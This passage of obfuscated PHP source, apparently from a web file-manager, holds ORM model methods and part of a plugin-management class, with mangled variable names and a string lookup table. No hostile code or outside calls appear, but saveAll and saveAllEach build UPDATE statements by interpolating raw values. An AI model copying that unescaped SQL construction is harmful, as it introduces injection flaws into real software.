$this->optionsValue($öÏìß‰€); $ÅœÏÈ¡ = $this->page($á€ãìèñ, $ƒŒŞá)->select(); $˜šéŒÜ† = is_array($ÅœÏÈ¡) ? count($ÅœÏÈ¡) : 0; if ($˜šéŒÜ† < $ƒŒŞá) { $ö«”‚æÍ = 1; } else { $this->optionsValue($¢‰÷†“¯); $˜šéŒÜ† = intval($this->count()); $ö«”‚æÍ = ceil($˜šéŒÜ† / $ƒŒŞá); } } else { $this->optionsValue($¢‰÷†“¯); $˜šéŒÜ† = intval($this->count()); $ö«”‚æÍ = ceil($˜šéŒÜ† / $ƒŒŞá); $á€ãìèñ = $á€ãìèñ >= $ö«”‚æÍ ? $ö«”‚æÍ : $á€ãìèñ; $this->optionsValue($öÏìß‰€); $ÅœÏÈ¡ = $this->page($á€ãìèñ, $ƒŒŞá)->select(); } if (!is_array($ÅœÏÈ¡)) { $ÅœÏÈ¡ = array(); } if ($ö«”‚æÍ == 1) { $˜šéŒÜ† = count($ÅœÏÈ¡); } $ëÃ¨ÏÏÜ = array($ı½á°Çş[454] => array($ı½á°Çş[455] => $˜šéŒÜ†, $ı½á°Çş[451] => $ƒŒŞá, $ı½á°Çş[440] => $á€ãìèñ, $ı½á°Çş[456] => $ö«”‚æÍ), $ı½á°Çş[457] => $ÅœÏÈ¡); return $ëÃ¨ÏÏÜ; } protected function checkLength($ç¹‰‚´Ó, $ÈÀñ§‹– = 0, $˜Å‚“¦Å = '') { $¸ÁñãÎõ =& $_SERVER[‹‰”››ê]; $ÈÀñ§‹– = $ÈÀñ§‹– ? $ÈÀñ§‹– : 65536; if (!$ç¹‰‚´Ó || strlen($ç¹‰‚´Ó) < $ÈÀñ§‹–) { return; } $˜Å‚“¦Å = $˜Å‚“¦Å ? $˜Å‚“¦Å . $¸ÁñãÎõ[74] : $¸ÁñãÎõ[12]; show_json($˜Å‚“¦Å . LNG($¸ÁñãÎõ[458]) . "\50{$ÈÀñ§‹–}\x29", !1); } protected function metaSet($„ÛùøÍß, $›ÛóûÎ = null, $Ÿ³íĞ¤ = null) { $­î†™—í =& $_SERVER[‹‰”››ê]; if (!$this->tableMeta || !$„ÛùøÍß) { return !1; } $Ï‡¯ìèù = $this->tableMeta[$­î†™—í[459]]; $«¤ıå”ñ = $this->tableMeta[$­î†™—í[460]]; $†è†ß—· = Model($«¤ıå”ñ); $’éÜÉ– = array($Ï‡¯ìèù => $„ÛùøÍß, $­î†™—í[461] => $›ÛóûÎ); if (is_null($›ÛóûÎ)) { return $†è†ß—·->where(array($Ï‡¯ìèù => $„ÛùøÍß))->delete(); } if (is_null($Ÿ³íĞ¤) && is_string($›ÛóûÎ)) { return $†è†ß—·->where($’éÜÉ–)->delete(); } $­Ğ‡ïèì = is_array($›ÛóûÎ) ? $›ÛóûÎ : array(); if (is_string($›ÛóûÎ)) { $­Ğ‡ïèì[$›ÛóûÎ] = $Ÿ³íĞ¤; } $³ÉÛ“› = array(); foreach ($­Ğ‡ïèì as $ü»ìàŸÌ => $¥ÑÍ’œÏ) { if (is_null($¥ÑÍ’œÏ) && is_string($ü»ìàŸÌ)) { $†è†ß—·->where(array($Ï‡¯ìèù => $„ÛùøÍß, $­î†™—í[461] => $ü»ìàŸÌ))->delete(); continue; } $this->checkLength($¥ÑÍ’œÏ, !1, $«¤ıå”ñ . $­î†™—í[4] . $ü»ìàŸÌ); $³ÉÛ“›[] = array($Ï‡¯ìèù => $„ÛùøÍß, $­î†™—í[97] => $ü»ìàŸÌ, $­î†™—í[462] => $¥ÑÍ’œÏ); } $‚¾¤®€¿ = $­î†™—í[463] . $«¤ıå”ñ; CacheLock::lock($‚¾¤®€¿); $†è†ß—·->where(array($Ï‡¯ìèù => $„ÛùøÍß))->addAll($³ÉÛ“›, array(), !0); CacheLock::unlock($‚¾¤®€¿); return !0; } public function metaGet($ñ„ÀÍ¥¯, $ÎÊŒø•à = false) { $óí¾÷ôå =& $_SERVER[‹‰”››ê]; if (!$this->tableMeta) { return array(); } $½Úµ—ğ = $this->tableMeta[$óí¾÷ôå[459]]; $å¨ä”ø = Model($this->tableMeta[$óí¾÷ôå[460]]); if ($ÎÊŒø•à) { $Øµ·Ç´Ó = array($½Úµ—ğ => $ñ„ÀÍ¥¯, $óí¾÷ôå[97] => $ÎÊŒø•à); return $å¨ä”ø->where($Øµ·Ç´Ó)->getField($óí¾÷ôå[462]); } $Øµ·Ç´Ó = array($½Úµ—ğ => $ñ„ÀÍ¥¯); $ëãœàÀ„ = $å¨ä”ø->field($óí¾÷ôå[464])->where($Øµ·Ç´Ó)->select(); $ëãœàÀ„ = array_to_keyvalue($ëãœàÀ„, $óí¾÷ôå[97], $óí¾÷ôå[462]); return $ëãœàÀ„; } private function checkDataAutoHas($†¬ç„ü) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ŠÃ¹÷µ­) { if (in_array($†¬ç„ü, explode($_SERVER[‹‰”››ê][50], $ŠÃ¹÷µ­[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ï»Ñı•Ï, $ù¡±é£) { $ñğ­ñ°ï =& $_SERVER[‹‰”››ê]; if (!is_array($ï»Ñı•Ï)) { return; } foreach ($this->dataAuto as $¾„ĞÒâ) { $š„Ø©¡§ = $¾„ĞÒâ[0]; if (!in_array($ù¡±é£, explode($ñğ­ñ°ï[50], $¾„ĞÒâ[2]))) { continue; } switch (trim($¾„ĞÒâ[3])) { case $ñğ­ñ°ï[408]: case $ñğ­ñ°ï[409]: $—™íÖÃ = $¾„ĞÒâ[1]; $Ú¥¼ÙÃ = isset($¾„ĞÒâ[4]) ? (array) $¾„ĞÒâ[4] : array(); if ($—™íÖÃ == $ñğ­ñ°ï[207] && array_key_exists($š„Ø©¡§, $ï»Ñı•Ï)) { if (!$ï»Ñı•Ï[$š„Ø©¡§]) { unset($ï»Ñı•Ï[$š„Ø©¡§]); } break; } if (isset($ï»Ñı•Ï[$š„Ø©¡§])) { array_unshift($Ú¥¼ÙÃ, $ï»Ñı•Ï[$š„Ø©¡§]); } if ($ñğ­ñ°ï[408] == $¾„ĞÒâ[3]) { $ï»Ñı•Ï[$š„Ø©¡§] = call_user_func_array($—™íÖÃ, $Ú¥¼ÙÃ); } else { $ï»Ñı•Ï[$š„Ø©¡§] = call_user_func_array(array(&$this, $—™íÖÃ), $Ú¥¼ÙÃ); } break; case $ñğ­ñ°ï[359]: if (isset($ï»Ñı•Ï[$š„Ø©¡§]) && $ï»Ñı•Ï[$š„Ø©¡§]) { $ï»Ñı•Ï[$š„Ø©¡§] = call_user_func_array(array(&$this, $¾„ĞÒâ[1]), array($ï»Ñı•Ï[$š„Ø©¡§])); } break; case $ñğ­ñ°ï[362]: $ï»Ñı•Ï[$š„Ø©¡§] = $ï»Ñı•Ï[$¾„ĞÒâ[1]]; break; case $ñğ­ñ°ï[381]: if (isset($ï»Ñı•Ï[$š„Ø©¡§]) && !is_string($ï»Ñı•Ï[$š„Ø©¡§])) { $ï»Ñı•Ï[$š„Ø©¡§] = json_encode_force($ï»Ñı•Ï[$š„Ø©¡§]); } break; case $ñğ­ñ°ï[410]: if ($ï»Ñı•Ï[$š„Ø©¡§] === $ñğ­ñ°ï[12]) { unset($ï»Ñı•Ï[$š„Ø©¡§]); } break; case $ñğ­ñ°ï[411]: $ï»Ñı•Ï[$š„Ø©¡§] = $¾„ĞÒâ[1]; default: break; } } if ($ù¡±é£ == $ñğ­ñ°ï[442]) { $—íö½–´ = strtolower($this->db->getDbType()); if (strpos($—íö½–´, $ñğ­ñ°ï[13]) !== 0) { return; } $î§ë²£ = $this->field(!0)->fields; $¹¯´‰ = $î§ë²£[$ñğ­ñ°ï[341]]; if (isset($î§ë²£[$ñğ­ñ°ï[340]])) { unset($¹¯´‰[$î§ë²£[$ñğ­ñ°ï[340]]]); } foreach ($¹¯´‰ as $Æ¥˜›â£ => $ù¡±é£) { if (!isset($ï»Ñı•Ï[$Æ¥˜›â£])) { $ï»Ñı•Ï[$Æ¥˜›â£] = $ñğ­ñ°ï[12]; } } } } private function dataAfterFilter(&$Š¿„ş) { $çº÷˜Şô =& $_SERVER[‹‰”››ê]; foreach ($this->dataAuto as $Ä´¾À££) { $’·Ïï•à = $Ä´¾À££[0]; if (!isset($Š¿„ş[$’·Ïï•à])) { continue; } if (!in_array($çº÷˜Şô[444], explode($çº÷˜Şô[50], $Ä´¾À££[2]))) { continue; } switch (trim($Ä´¾À££[3])) { case $çº÷˜Şô[408]: case $çº÷˜Şô[409]: $³äÄü´¼ = isset($Ä´¾À££[4]) ? (array) $Ä´¾À££[4] : array(); array_unshift($³äÄü´¼, $Š¿„ş[$’·Ïï•à]); if (isset($Ä´¾À££[4]) && $Ä´¾À££[4] == $çº÷˜Şô[465]) { $³äÄü´¼ = array($Š¿„ş[$’·Ïï•à]); } if ($çº÷˜Şô[408] == $Ä´¾À££[3]) { $Š¿„ş[$’·Ïï•à] = call_user_func_array($Ä´¾À££[1], $³äÄü´¼); } else { $Š¿„ş[$’·Ïï•à] = call_user_func_array(array(&$this, $Ä´¾À££[1]), $³äÄü´¼); } break; case $çº÷˜Şô[359]: if (isset($Š¿„ş[$’·Ïï•à]) && $Š¿„ş[$’·Ïï•à]) { $Š¿„ş[$’·Ïï•à] = call_user_func_array(array(&$this, $Ä´¾À££[1]), array($Š¿„ş[$’·Ïï•à])); } break; case $çº÷˜Şô[362]: $Š¿„ş[$’·Ïï•à] = $Š¿„ş[$Ä´¾À££[1]]; break; case $çº÷˜Şô[381]: $Ì´×’ı¤ = $Š¿„ş[$’·Ïï•à]; $Š¿„ş[$’·Ïï•à] = json_decode($Ì´×’ı¤, !0); if (is_null($Š¿„ş[$’·Ïï•à])) { $Š¿„ş[$’·Ïï•à] = $Ì´×’ı¤; } break; case $çº÷˜Şô[410]: if ($Š¿„ş[$’·Ïï•à] === $çº÷˜Şô[12]) { unset($Š¿„ş[$’·Ïï•à]); } break; case $çº÷˜Şô[411]: $Š¿„ş[$’·Ïï•à] = $Ä´¾À££[1]; break; default: break; } } } public function saveAll($†–Î§¼“) { $šüõ‡º =& $_SERVER[‹‰”››ê]; $è°¡ÜÖÂ = $this->tablePrefix . $this->tableName; $·—²©Î = self::SQL_WHERE_IN_CHUNK; $†–Î§¼“ = is_array($†–Î§¼“) ? $†–Î§¼“ : array(); $¥èãÙº = $šüõ‡º[466]; $‹ââìêá = 0; $Ü¥·üà¡ = array(); $ŒÀÍ ïÁ = count($†–Î§¼“); for ($ÈöÁş™¼ = 0; $ÈöÁş™¼ < $ŒÀÍ ïÁ; $ÈöÁş™¼++) { $ô¦„Ã±ç = $†–Î§¼“[$ÈöÁş™¼]; if (!is_array($ô¦„Ã±ç) || count($ô¦„Ã±ç) != 4) { continue; } $„ßºİŒ = "\x55\x50\x44\101\124\x45\x20\140{$è°¡ÜÖÂ}\x60\x20\x53\x45\x54\x20{$ô¦„Ã±ç[2]}\40\x3d\x20\103\x41\123\x45\x20{$ô¦„Ã±ç[0]}\40\xa"; if ($‹ââìêá == 0) { $¥èãÙº = $„ßºİŒ; } $Ü¥·üà¡[] = $šüõ‡º[121] . $ô¦„Ã±ç[1] . $šüõ‡º[121]; $‹ââìêá++; $¥èãÙº .= "\x20\x57\110\x45\x4e\x20\47{$ô¦„Ã±ç[1]}\47\40\124\110\x45\x4e\40\47{$ô¦„Ã±ç[3]}\47\40\12"; if ($‹ââìêá == $·—²©Î || $ÈöÁş™¼ == $ŒÀÍ ïÁ - 1) { $ˆïÃ‚¥İ = implode($šüõ‡º[50], $Ü¥·üà¡); $¥èãÙº .= "\x20\x45\x4e\x44\40\40\127\110\x45\x52\x45\40{$ô¦„Ã±ç[0]}\x20\111\x4e\40\x28{$ˆïÃ‚¥İ}\x29\40"; $this->execute($¥èãÙº); $‹ââìêá = 0; $¥èãÙº = $„ßºİŒ; $this->chunkEventCheck(count($Ü¥·üà¡)); $Ü¥·üà¡ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ú¾ÜÄ²) { $´á”Û =& $_SERVER[‹‰”››ê]; $×ö¥â = $this->tablePrefix . $this->tableName; foreach ($ú¾ÜÄ² as $”¥ıú) { if (!is_array($”¥ıú) || count($”¥ıú) != 4) { continue; } $æ×ƒŸ» = $”¥ıú[0] . $´á”Û[467] . $”¥ıú[1] . $´á”Û[121]; $ŸÕ«Ô³Á = $”¥ıú[2] . $´á”Û[467] . $”¥ıú[3] . $´á”Û[121]; $ÀÅÃ§‚– = "\x75\x70\x64\x61\x74\145\x20{$×ö¥â}\x20\163\x65\x74\40{$ŸÕ«Ô³Á}\x20\x77\x68\145\162\145\40{$æ×ƒŸ»}\73"; $this->execute($ÀÅÃ§‚–); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¦çìØ¯Û = false, $ÇÌ“éãŸ = false) { $this->_chunkEvent = $¦çìØ¯Û; $this->_chunkEventParam = $ÇÌ“éãŸ; } private function chunkEventCheck($ª†½¬‰à) { if (!$this->_chunkEvent) { return; } $Ä£Æë×¥ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Ä£Æë×¥[$_SERVER[‹‰”››ê][468]] = $ª†½¬‰à; Hook::trigger($this->_chunkEvent, $Ä£Æë×¥); } public function addAll($ÇàÍ¶ïå, $îü‡ÚÀ® = array(), $Š„™ÌÇ÷ = false) { $¼›·“ò =& $_SERVER[‹‰”››ê]; ignore_timeout(); $ËƒŠÃéÓ = self::SQL_WHERE_IN_CHUNK; if (empty($ÇàÍ¶ïå)) { $this->error = think_lang($¼›·“ò[360]); return !1; } $îü‡ÚÀ® = $this->_parseOptions($îü‡ÚÀ®); foreach ($ÇàÍ¶ïå as $ÍÄ®âúÏ => $ÌÜ…¸·ì) { $ÇàÍ¶ïå[$ÍÄ®âúÏ] = $this->_facade($ÌÜ…¸·ì); $this->_beforeInsert($ÇàÍ¶ïå[$ÍÄ®âúÏ], $îü‡ÚÀ®); } if (method_exists($this->db, $¼›·“ò[361])) { for ($–¸¡–¬ô = 0; $–¸¡–¬ô < count($ÇàÍ¶ïå); $–¸¡–¬ô += $ËƒŠÃéÓ) { $ìÖÊ‰ô = array_slice($ÇàÍ¶ïå, $–¸¡–¬ô, $ËƒŠÃéÓ); if (!is_array($ìÖÊ‰ô) || count($ìÖÊ‰ô) == 0) { break; } $ºå¼Üòü = $this->db->insertAll($ìÖÊ‰ô, $îü‡ÚÀ®, $Š„™ÌÇ÷); $this->chunkEventCheck(count($ìÖÊ‰ô)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ÇàÍ¶ïå as $ÍÄ®âúÏ => $ÌÜ…¸·ì) { $ºå¼Üòü = $this->db->insert($ÌÜ…¸·ì, $îü‡ÚÀ®, $Š„™ÌÇ÷); } $this->commit(); } if (!1 !== $ºå¼Üòü) { $İ¡£éâŠ = $this->getLastInsID(); if ($İ¡£éâŠ) { return $İ¡£éâŠ; } } return $ºå¼Üòü; } public function save($™©¶¥²¡ = '', $”½å¶› = array()) { $Õ¹‘º¸ë =& $_SERVER[‹‰”››ê]; $½°üŒ¦ë = self::SQL_WHERE_IN_CHUNK; $‰âı¾Áñ = $this->optionsValue(); $ìöÏŸò¦ = $this->findWhereField($‰âı¾Áñ); if (!$ìöÏŸò¦) { return parent::save($™©¶¥²¡, $”½å¶›); } $À‘æ’ñ = 0; $ëÇĞˆùí = $‰âı¾Áñ[$Õ¹‘º¸ë[364]][$ìöÏŸò¦][1]; $ëÇĞˆùí = is_array($ëÇĞˆùí) ? $ëÇĞˆùí : array(); $à¦»¿œõ = count($ëÇĞˆùí); for ($ìªÂšœ¬ = 0; $ìªÂšœ¬ < $à¦»¿œõ; $ìªÂšœ¬ += $½°üŒ¦ë) { $¼†É İ = array_slice($ëÇĞˆùí, $ìªÂšœ¬, $½°üŒ¦ë); if (!is_array($¼†É İ) || count($¼†É İ) == 0) { break; } $‰âı¾Áñ[$Õ¹‘º¸ë[364]][$ìöÏŸò¦][1] = $¼†É İ; $this->optionsValue($‰âı¾Áñ); $À‘æ’ñ += parent::save($™©¶¥²¡, $”½å¶›); $this->chunkEventCheck(count($¼†É İ)); } $this->chunkEventSet(); return $À‘æ’ñ; } public function add($¶ä—…“ = '', $˜—¦¸¤Ï = array(), $¥íÁç˜¯ = false) { if ($this->addTaskStatus && is_array($¶ä—…“)) { $this->addTaskData[] = $¶ä—…“; return; } return parent::add($¶ä—…“, $˜—¦¸¤Ï, $¥íÁç˜¯); } public function parseWhereLike($ˆœªÄ¨, $—š¹ ™´ = '', $ÜçåÏ’˜ = false, &$é…Ÿ±¥¼ = false) { $„ç­“¥¯ =& $_SERVER[‹‰”››ê]; $ì›·Í„Í = $GLOBALS[$„ç­“¥¯[6]][$„ç­“¥¯[469]]; if (!$ì›·Í„Í[$„ç­“¥¯[470]]) { return $ˆœªÄ¨; } if (!is_array($ˆœªÄ¨)) { return $ˆœªÄ¨; } $Û§Ğïñ = array(); $ÓŠŒ»ò¸ = 0; foreach ($ˆœªÄ¨ as $·¾¬Íı => $‘”¼»„å) { if (is_array($‘”¼»„å) && count($‘”¼»„å) == 2 && $‘”¼»„å[0] == $„ç­“¥¯[471] && is_string($‘”¼»„å[1]) && substr($‘”¼»„å[1], 0, 1) == $„ç­“¥¯[472] && substr($‘”¼»„å[1], strlen($‘”¼»„å[1]) - 1, 1) == $„ç­“¥¯[472]) { $é…Ÿ±¥¼ = !0; $İìïƒÒ = is_string($·¾¬Íı) ? $·¾¬Íı : $—š¹ ™´; $Ù¹åŒ¿” = substr($‘”¼»„å[1], 1, strlen($‘”¼»„å[1]) - 2); $Ù¹åŒ¿” = $this->db->escapeString($Ù¹åŒ¿”); if (!strpos($İìïƒÒ, $„ç­“¥¯[10])) { $İìïƒÒ = $„ç­“¥¯[473] . $İìïƒÒ . $„ç­“¥¯[473]; } $ïÎ«ÓşŒ = $„ç­“¥¯[223] . $Ù¹åŒ¿” . $„ç­“¥¯[223]; $Ù¹åŒ¿” = str_replace(array($„ç­“¥¯[10], $„ç­“¥¯[474], $„ç­“¥¯[11]), $„ç­“¥¯[475], $Ù¹åŒ¿”); if ($ì›·Í„Í[$„ç­“¥¯[476]]) { $ïÎ«ÓşŒ = $„ç­“¥¯[477] . $Ù¹åŒ¿” . $„ç­“¥¯[478]; if ($ì›·Í„Í[$„ç­“¥¯[479]]) { $ïÎ«ÓşŒ = $„ç­“¥¯[478] . $Ù¹åŒ¿” . $„ç­“¥¯[477]; } } $Û§Ğïñ[$ÓŠŒ»ò¸] = $„ç­“¥¯[480] . $İìïƒÒ . $„ç­“¥¯[481] . $ïÎ«ÓşŒ . $„ç­“¥¯[482]; $ÓŠŒ»ò¸++; continue; } if (is_array($‘”¼»„å)) { $—š¹ ™´ = is_string($·¾¬Íı) ? $·¾¬Íı : $—š¹ ™´; $‘”¼»„å = $this->parseWhereLike($‘”¼»„å, $—š¹ ™´, !0, $é…Ÿ±¥¼); } if (is_numeric($·¾¬Íı)) { $Û§Ğïñ[$ÓŠŒ»ò¸] = $‘”¼»„å; $ÓŠŒ»ò¸++; } else { $Û§Ğïñ[$·¾¬Íı] = $‘”¼»„å; } } if ($é…Ÿ±¥¼ && !$ÜçåÏ’˜) { } return $Û§Ğïñ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ª·´²ºŠ = array()) { $óÕó½œ =& $_SERVER[‹‰”››ê]; $ÆÆŒÂî = self::SQL_WHERE_IN_CHUNK; $­Õ•’ò• = $this->optionsValue(); $¦ªÖ¡Ûİ = $this->findWhereField($­Õ•’ò•); if (!$¦ªÖ¡Ûİ || isset($­Õ•’ò•[$óÕó½œ[379]]) || isset($­Õ•’ò•[$óÕó½œ[440]])) { return parent::select($ª·´²ºŠ); } $Âõİİ®ó = $­Õ•’ò•[$óÕó½œ[364]][$¦ªÖ¡Ûİ][1]; $Âõİİ®ó = is_array($Âõİİ®ó) ? $Âõİİ®ó : array(); $øªÅÚ¼÷ = null; for ($÷®õÈ€ = 0; $÷®õÈ€ < count($Âõİİ®ó); $÷®õÈ€ += $ÆÆŒÂî) { $³¼§¬À = array_slice($Âõİİ®ó, $÷®õÈ€, $ÆÆŒÂî); if (!is_array($³¼§¬À) || count($³¼§¬À) == 0) { break; } $­Õ•’ò•[$óÕó½œ[364]][$¦ªÖ¡Ûİ][1] = $³¼§¬À; $this->optionsValue($­Õ•’ò•); $à¼ô‘—ª = parent::select($ª·´²ºŠ); if (!$à¼ô‘—ª) { continue; } $øªÅÚ¼÷ = is_array($øªÅÚ¼÷) ? $øªÅÚ¼÷ : array(); $øªÅÚ¼÷ = array_merge($øªÅÚ¼÷, $à¼ô‘—ª); } return $øªÅÚ¼÷; } public function delete($”Û•ŞÎ = array()) { $ó¯ëÁšô =& $_SERVER[‹‰”››ê]; $÷öÃÀÒ¡ = self::SQL_WHERE_IN_CHUNK; $´†©Ñğ = $this->optionsValue(); $Í·”£©Ê = $this->findWhereField($´†©Ñğ); if (!$Í·”£©Ê) { return parent::delete($”Û•ŞÎ); } $‹üÙ—ï = 0; $ß›ñ†°‘ = $´†©Ñğ[$ó¯ëÁšô[364]][$Í·”£©Ê][1]; $ß›ñ†°‘ = is_array($ß›ñ†°‘) ? $ß›ñ†°‘ : array(); for ($©ÙëÅÍ­ = 0; $©ÙëÅÍ­ < count($ß›ñ†°‘); $©ÙëÅÍ­ += $÷öÃÀÒ¡) { $µÓ¬øƒ€ = array_slice($ß›ñ†°‘, $©ÙëÅÍ­, $÷öÃÀÒ¡); if (!is_array($µÓ¬øƒ€) || count($µÓ¬øƒ€) == 0) { break; } $´†©Ñğ[$ó¯ëÁšô[364]][$Í·”£©Ê][1] = $µÓ¬øƒ€; $this->optionsValue($´†©Ñğ); $‹üÙ—ï += parent::delete($”Û•ŞÎ); } return $‹üÙ—ï; } private function findWhereField($Óîõ¤Ù) { $ãıØş´ê =& $_SERVER[‹‰”››ê]; $Ä×ˆÒê¼ = self::SQL_WHERE_IN_CHUNK; if (!is_array($Óîõ¤Ù) || !is_array($Óîõ¤Ù[$ãıØş´ê[364]])) { return !1; } foreach ($Óîõ¤Ù[$ãıØş´ê[364]] as $€€İàæŸ => $œÕÜìßú) { if (is_array($œÕÜìßú) && isset($œÕÜìßú[0]) && is_string($œÕÜìßú[0]) && strtolower($œÕÜìßú[0]) == $ãıØş´ê[7] && is_array($œÕÜìßú[1]) && count($œÕÜìßú[1]) > $Ä×ˆÒê¼) { ignore_timeout(); return $€€İàæŸ; } } return !1; } public function setMasterDB($…øÑ­İè = true) { think_config($_SERVER[‹‰”››ê][483], $…øÑ­İè); } } goto f¥õùòã¸è; c¬›Ü¿—ºµ: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\160\x6c\165\x67\x69\x6e\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\145", "\x73\x74\141\x74\165\x73", "\162\x65\147\151\145\x73\x74", "\143\x6f\x6e\x66\x69\x67"); public function loadList($éÎ‹î½® = false) { $¢»ÁË—À = array_to_keyvalue($this->listData(), $_SERVER[‹‰”››ê][32]); if ($éÎ‹î½®) { return $¢»ÁË—À[$éÎ‹î½®]; } return $¢»ÁË—À; } public function init() { $ôÔ§¹ë =& $_SERVER[‹‰”››ê]; Hook::trigger($ôÔ§¹ë[2116]); $¤šáÖÑÛ = $this->loadPluginList(); foreach ($¤šáÖÑÛ as $èüä–öø => $Ÿ®ÒË…Ş) { $š¶Éî×ú = $this->appAllow($èüä–öø, $Ÿ®ÒË…Ş); if (!$š¶Éî×ú) { continue; } foreach ($Ÿ®ÒË…Ş[$ôÔ§¹ë[2117]] as $Ø™€™ŞÛ => $²áÇÇÉš) { Hook::bind($Ø™€™ŞÛ, $²áÇÇÉš); } } Hook::trigger($ôÔ§¹ë[2118]); Hook::trigger(ACTION); } public function appAllow($Ì¨Ş®, $Æ°¢à›™, $¤Éìß½ª = true) { $ûœæø¾ =& $_SERVER[‹‰”››ê]; $…üß„÷À = PLUGIN_DIR . $Ì¨Ş® . $ûœæø¾[2119]; if (!is_array($Æ°¢à›™) || !is_array($Æ°¢à›™[$ûœæø¾[2117]]) || $Æ°¢à›™[$ûœæø¾[840]] != 1 || !is_file($…üß„÷À)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$ûœæø¾[6]][$ûœæø¾[2120]] || !$GLOBALS[$ûœæø¾[6]][$ûœæø¾[2121]]) { return !0; } $Ã¥ÓˆÛˆ = explode($ûœæø¾[50], strtolower($GLOBALS[$ûœæø¾[6]][$ûœæø¾[2121]])); return in_array(strtolower($Ì¨Ş®), $Ã¥ÓˆÛˆ) ? !1 : !0; } if ($¤Éìß½ª && !Action($ûœæø¾[2122])->checkAuth($Ì¨Ş®)) { return !1; } return !0; } public function unInstall($¬¦”Ûâ¥) { $µôìÕª =& $_SERVER[‹‰”››ê]; $§áÇàçÏ = $this->loadList($¬¦”Ûâ¥); if (file_exists(PLUGIN_DIR . $¬¦”Ûâ¥)) { Hook::apply($¬¦”Ûâ¥ . $µôìÕª[2123]); } $this->remove($§áÇàçÏ[$µôìÕª[487]]); } public function changeStatus($œÌÊ³ú±, $âÖäü”û) { $Ô¤¾«¹è =& $_SERVER[‹‰”››ê]; $óóÆ¦¼ = $this->loadList($œÌÊ³ú±); if ($âÖäü”û) { Hook::apply($œÌÊ³ú± . $Ô¤¾«¹è[2124]); } $this->update($óóÆ¦¼[$Ô¤¾«¹è[487]], array($Ô¤¾«¹è[2125] => $âÖäü”û)); } public function appRegist($„Ï‹šÌ, $êë¼ÈË) { $¡êÕÏ–Õ =& $_SERVER[‹‰”››ê]; $³°³şƒ» = $this->loadList($„Ï‹šÌ); if ($³°³şƒ») { $this->update($³°³şƒ»[$¡êÕÏ–Õ[487]], array($¡êÕÏ–Õ[2117] => $êë¼ÈË)); } else { $Ì®ü˜ôÖ = array($¡êÕÏ–Õ[32] => $„Ï‹šÌ, $¡êÕÏ–Õ[2117] => $êë¼ÈË, $¡êÕÏ–Õ[840] => 0, $¡êÕÏ–Õ[6] => $this->getConfigDefault($„Ï‹šÌ)); $this->insert($Ì®ü˜ôÖ); } } public function getConfigDefault($Å§á·È‚) { $òæ»ÆÙ =& $_SERVER[‹‰”››ê]; $˜Ûï¸À = array(); $Ô® «“Ø = $this->getPackageJson($Å§á·È‚); if (!$Ô® «“Ø && is_array($Ô® «“Ø[$òæ»ÆÙ[2126]])) { return $˜Ûï¸À; } foreach ($Ô® «“Ø[$òæ»ÆÙ[2126]] as $Å¢¦†âß => $¸Ó³ô­) { if (!isset($¸Ó³ô­[$òæ»ÆÙ[462]]) || isset($˜Ûï¸À[$Å¢¦†âß])) { continue; } $˜Ûï¸À[$Å¢¦†âß] = $¸Ó³ô­[$òæ»ÆÙ[462]]; } return $˜Ûï¸À; } public function getPackageJson($—ó†óÁÑ) { return Hook::apply($—ó†óÁÑ . $_SERVER[‹‰”››ê][2127]); } public function getConfig($š¯‰ÍÈ¦, $÷»³°Ú¢ = false) { $ÉÙÖÄîş =& $_SERVER[‹‰”››ê]; $ç×‡¡Âù = array(); $‚‚ş»“¨ = $this->loadList($š¯‰ÍÈ¦); if ($‚‚ş»“¨ && is_array($‚‚ş»“¨[$ÉÙÖÄîş[6]])) { $ç×‡¡Âù = $‚‚ş»“¨[$ÉÙÖÄîş[6]]; } if (!$ç×‡¡Âù || $÷»³°Ú¢) { $ç×‡¡Âù = $this->getConfigDefault($š¯‰ÍÈ¦); } return $ç×‡¡Âù; } public function setConfig($è¾Úùæ¦, $‡‡—Ïè‹ = false) { $ÊŒàú“ =& $_SERVER[‹‰”››ê]; $ıÊÕÄ = $this->loadList($è¾Úùæ¦); if (!$ıÊÕÄ) { return !1; } $†ö©Ã¾  = $ıÊÕÄ[$ÊŒàú“[6]]; if ($‡‡—Ïè‹ == !1) { $†ö©Ã¾  = array(); $‡‡—Ïè‹ = $this->getConfigDefault($è¾Úùæ¦); } foreach ($‡‡—Ïè‹ as $·óÎ¥€º => $Ÿœüû—Œ) { $†ö©Ã¾ [$·óÎ¥€º] = is_string($Ÿœüû—Œ) ? trim($Ÿœüû—Œ) : $Ÿœüû—Œ; } $this->update($ıÊÕÄ[$ÊŒàú“[487]], array($ÊŒàú“[6] => $†ö©Ã¾ )); } public function viewList() { $èÓÀç¨ƒ =& $_SERVER[‹‰”››ê]; $’óıÇú› = $this->loadList(); $this->pluginScan($’óıÇú›); $’óıÇú› = $this->loadPluginList(); $Ï Ï¼ø½ = array(); foreach ($’óıÇú› as $˜••â => $‚™»‘×í) { $ß‰À˜‹Ì = $‚™»‘×í; unset($‚™»‘×í[$èÓÀç¨ƒ[2117]], $‚™»‘×í[$èÓÀç¨ƒ[6]]); $Ù£Ş’½Í = PLUGIN_DIR . $‚™»‘×í[$èÓÀç¨ƒ[32]] . $èÓÀç¨ƒ[2119]; if (!is_file($Ù£Ş’½Í)) { continue; } $èÜÉÉßÕ = Hook::apply($‚™»‘×í[$èÓÀç¨ƒ[32]] . $èÓÀç¨ƒ[2127]); if (!is_array($èÜÉÉßÕ)) { continue; } $Ï Ï¼ø½[$˜••â] = array_merge($‚™»‘×í, $èÜÉÉßÕ); if ($ß‰À˜‹Ì[$èÓÀç¨ƒ[6]][$èÓÀç¨ƒ[1702]] != $èÜÉÉßÕ[$èÓÀç¨ƒ[1676]]) { Hook::apply($‚™»‘×í[$èÓÀç¨ƒ[32]] . $èÓÀç¨ƒ[2124]); 